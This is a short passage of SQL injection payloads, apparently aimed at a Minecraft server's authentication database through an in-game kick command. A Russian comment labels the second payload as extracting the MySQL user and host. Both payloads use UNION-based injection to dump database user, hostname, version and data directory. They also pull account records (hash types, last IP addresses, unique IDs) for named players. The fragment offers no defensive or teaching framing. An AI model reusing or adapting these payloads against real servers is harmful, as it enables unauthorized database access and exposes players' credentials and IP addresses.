FROM (SELECT * FROM mc_auth_accounts WHERE player_id = 'r_asw
' LIMIT 1) AS p1 
CROSS JOIN (SELECT * FROM mc_auth_accounts WHERE player_id = 'BadikPlay' LIMIT 1) AS p2;#

Извлекаем mysql юзера и хост
/кик ' AND FALSE UNION ALL SELECT 
p1.id, p2.player_id, p2.player_id_type, p2.hash_type, p2.last_ip, p2.unique_id, 
CONCAT('User: ', CURRENT_USER(), ' | Host: ', @@hostname),
CONCAT('Version: ', @@version, ' | Data: ', @@datadir),
p2.last_quit, p2.last_session_start 
FROM (SELECT * FROM mc_auth_accounts WHERE player_id = 'r_asw' LIMIT 1) AS p1 
CROSS JOIN (SELECT * FROM mc_auth_accounts WHERE player_id = 'md_5' LIMIT 1) AS p2;#set

